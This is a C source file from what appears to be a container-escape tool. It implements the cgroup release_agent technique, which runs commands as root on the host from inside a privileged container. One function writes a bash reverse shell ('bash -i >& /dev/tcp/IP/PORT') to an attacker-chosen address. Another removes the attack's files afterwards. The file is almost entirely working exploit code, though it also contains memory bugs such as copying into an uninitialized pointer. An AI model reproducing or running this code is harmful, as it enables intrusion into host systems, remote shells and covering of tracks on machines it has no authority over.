#define _GNU_SOURCE
//
// Created by FlagT on 2022/6/22.
//

#include "release_agent.h"
#include <sched.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <signal.h>
#include "../util/random_str.h"
#include "../util/utils.h"
#include "../util/output.h"
#include "../util/custom_struts.h"

#define STACK_SIZE (1024 * 1024)
#define WAIT_RELEASE_AGENT_RUN_TIME 1

struct cgroup_procs_clone_args {
    char *cgroup_procs_path;
};

int clear_cgroup_procs(void *args) {
    int fd;
    char pid[10];
    struct cgroup_procs_clone_args *arg = (struct cgroup_procs_clone_args *) args;
    struct cgroup_procs_clone_args *cgroup_procs_args = (struct cgroup_procs_clone_args *) malloc(
            sizeof(struct cgroup_procs_clone_args));
    memcpy(cgroup_procs_args, arg, sizeof(struct cgroup_procs_clone_args));
    cgroup_procs_args->cgroup_procs_path = (char *) malloc(strlen(arg->cgroup_procs_path) * sizeof(char));
    strcpy(cgroup_procs_args->cgroup_procs_path, arg->cgroup_procs_path);

    sprintf(pid, "%d", getpid());
    if (attack_info.attack_mode != SHELL) {
        printf_wrapper(INFO, "Echo pid: %s to %s and this pid of process will close soon\n", pid,
                       cgroup_procs_args->cgroup_procs_path);
    }

    fd = open(cgroup_procs_args->cgroup_procs_path, O_WRONLY);
    write(fd, pid, strlen(pid));
    close(fd);
}

void clear_all() {
    int remove_controller_path_ret = remove_dir(release_agent_attack_info.controller_path);
    int umount_cgroup_ret = umount(release_agent_attack_info.mount_path);
    int remove_cgroup_mount_path_ret = remove_dir(release_agent_attack_info.mount_path);
    int remove_exp_path_ret = remove_file(release_agent_attack_info.exp_path);
    int remove_output_path_in_container_ret = 0;
    if (release_agent_attack_info.output_path_in_container != NULL && attack_info.attack_mode != SHELL && attack_info.attack_mode != REVERSE) {
        remove_output_path_in_container_ret = remove_file(release_agent_attack_info.output_path_in_container);
    }
    if (remove_controller_path_ret != 0 || remove_cgroup_mount_path_ret != 0 || remove_exp_path_ret != 0 ||
        remove_output_path_in_container_ret != 0 || umount_cgroup_ret != 0) {
        printf_wrapper(ERROR, "Failed to clear attack related file\n");
    } else {
        printf_wrapper(INFO, "Already clear attack related files\n");
    }
}

void release_agent_exec() {

    if (attack_info.attack_mode == SHELL && strcmp(attack_info.command, "quit") == 0) {
        clear_all();
        return;
    }

    int fd;
    int output_path_random_length = 5;
    char *output_path_random = malloc(output_path_random_length + 1);
    char *output_path_in_container;
    rand_string(output_path_random, output_path_random_length);
    char exp[2048] = "#!/bin/sh\n";
    char cgroup_procs_path[256];
    fd = open(release_agent_attack_info.exp_path, (O_CREAT | O_WRONLY | O_TRUNC));
    strcat(exp, attack_info.command);
    strcat(exp, " > ");
    strcat(exp, release_agent_attack_info.container_path_in_host);
    strcat(exp, "/tmp/");
    strcat(exp, output_path_random);

    write(fd, exp, strlen(exp));
    close(fd);

    strcpy(output_path_in_container, "/tmp/");
    strcat(output_path_in_container, output_path_random);

    release_agent_attack_info.output_path_in_container = (char *) malloc(512 * sizeof(char));
    strcpy(release_agent_attack_info.output_path_in_container, output_path_in_container);

    int exp_mode = S_IRUSR | S_IWUSR | S_IXUSR | S_IXGRP | S_IXOTH;
    chmod(release_agent_attack_info.exp_path, exp_mode);

    strcpy(cgroup_procs_path, release_agent_attack_info.controller_path);
    strcat(cgroup_procs_path, "/cgroup.procs");

    struct cgroup_procs_clone_args args;
    args.cgroup_procs_path = cgroup_procs_path;
    void *arg = (void *) &args;
    clone(clear_cgroup_procs, malloc(STACK_SIZE) + STACK_SIZE, SIGCLD, arg);
    if (attack_info.attack_mode != SHELL) {
        printf_wrapper(INFO, "Waiting for the command execution is completed (2s)\n");
    }
    sleep(WAIT_RELEASE_AGENT_RUN_TIME);

    struct stat s;
    stat(release_agent_attack_info.output_path_in_container, &s);
    char *exec_command_result_buffer = malloc(s.st_size * sizeof(char));
    memset(exec_command_result_buffer, 0x00, s.st_size);
    fd = open(release_agent_attack_info.output_path_in_container, O_RDONLY);
    read(fd, exec_command_result_buffer, s.st_size);
    if (attack_info.attack_mode != SHELL) {
        printf_wrapper(INFO, "Command execution results are as follows: \n");
    }
    if (exec_command_result_buffer[strlen(exec_command_result_buffer) - 1] != '\n') {
        printf("%s\n", exec_command_result_buffer);
    } else {
        printf("%s", exec_command_result_buffer);
    }
    close(fd);

    if (attack_info.attack_mode == EXEC) {
        clear_all();
    }

    if(attack_info.attack_mode == SHELL) {
        remove_file(release_agent_attack_info.output_path_in_container);
    }
}

void release_agent_reverse() {
    int fd;
    int output_path_random_length = 5;
    char *output_path_random = malloc(output_path_random_length + 1);
    char cgroup_procs_path[256];
    rand_string(output_path_random, output_path_random_length);
    char exp[2048] = "#!/bin/bash\n";
    fd = open(release_agent_attack_info.exp_path, (O_CREAT | O_WRONLY | O_TRUNC));
    strcat(exp, "bash -i >& /dev/tcp/");
    strcat(exp, attack_info.ip);
    strcat(exp, "/");
    strcat(exp, attack_info.port);
    strcat(exp, " 0>&1");

    write(fd, exp, strlen(exp));
    close(fd);

    int exp_mode = S_IRUSR | S_IWUSR | S_IXUSR | S_IXGRP | S_IXOTH;
    chmod(release_agent_attack_info.exp_path, exp_mode);

    strcpy(cgroup_procs_path, release_agent_attack_info.controller_path);
    strcat(cgroup_procs_path, "/cgroup.procs");

    struct cgroup_procs_clone_args args;
    args.cgroup_procs_path = cgroup_procs_path;
    void *arg = (void *) &args;
    clone(clear_cgroup_procs, malloc(STACK_SIZE) + STACK_SIZE, SIGCLD, arg);
    sleep(WAIT_RELEASE_AGENT_RUN_TIME);
    clear_all();
}


int escape_by_release_agent() {
    printf_wrapper(INFO, "Start escape by release_agent\n");
    const int cgroup_path_random_length = 10;
    const int controller_path_random_length = 5;
    const int release_agent_exp_path_length = 5;
    char mount_path[128] = "/tmp/tmp.";
    char *controller = "rdma";
    char controller_path[128];
    char release_agent_path[128];
    char notify_on_release_path[128];
    char release_agent_exp_path[256];
    char exp_path[128] = "/tmp/";

    //    Mount Cgroup
    //    Create cgroup mount path as clion remote development path e.g. "tmp.RwYWARK7Me"
    char *cgroup_path_random = malloc(cgroup_path_random_length + 1);
    rand_string(cgroup_path_random, cgroup_path_random_length);
    strcat(mount_path, cgroup_path_random);
    struct stat st = {0};
    if (stat(mount_path, &st) == -1) {
        mkdir(mount_path, 0700);
    }
    printf_wrapper(INFO, "Cgroup mount path: %s\n", mount_path);
    if (mount("cgroup", mount_path, "cgroup", 0, controller)) {
        perror("mount failed");
    }

    release_agent_attack_info.mount_path = (char *) malloc(512 * sizeof(char));
    strcpy(release_agent_attack_info.mount_path, mount_path);

    // create child cgroup
    char *controller_path_random = malloc(controller_path_random_length + 1);
    rand_string(controller_path_random, controller_path_random_length);
    strcpy(controller_path, mount_path);
    strcat(controller_path, "/");
    strcat(controller_path, controller_path_random);
    printf_wrapper(INFO, "New cgroup controller path: %s\n", controller_path);
    if (stat(controller_path, &st) == -1) {
        mkdir(controller_path, 0777);
    }
    release_agent_attack_info.controller_path = (char *) malloc(512 * sizeof(char));
    strcpy(release_agent_attack_info.controller_path, controller_path);

    //enable notify_on_release
    strcpy(notify_on_release_path, controller_path);
    strcat(notify_on_release_path, "/notify_on_release");

    printf_wrapper(INFO, "Enable notify_on_release: %s\n", notify_on_release_path);

    // set release_agent
    int fd;
    fd = open(notify_on_release_path, O_WRONLY);
    write(fd, "1", 1);
    close(fd);

    strcpy(release_agent_path, mount_path);
    strcat(release_agent_path, "/release_agent");
    printf_wrapper(INFO, "Path of release_agent: %s\n", release_agent_path);

    char *release_agent_exp_path_random = malloc(release_agent_exp_path_length + 1);
    rand_string(release_agent_exp_path_random, release_agent_exp_path_length);
    strcpy(release_agent_exp_path, release_agent_attack_info.container_path_in_host);
    strcat(release_agent_exp_path, "/tmp/");
    strcat(release_agent_exp_path, release_agent_exp_path_random);
    printf_wrapper(INFO, "Write exp_path to release_agent: %s\n", release_agent_exp_path);
    fd = open(release_agent_path, O_WRONLY);
    ssize_t len = write(fd, release_agent_exp_path, strlen(release_agent_exp_path));
    if (len < 0) {
        perror("[ERROR] Write failed");
    }
    close(fd);

    //
    strcat(exp_path, release_agent_exp_path_random);
    printf_wrapper(INFO, "Exp path: %s\n", exp_path);

    release_agent_attack_info.exp_path = (char *) malloc(512 * sizeof(char));
    strcpy(release_agent_attack_info.exp_path, exp_path);
}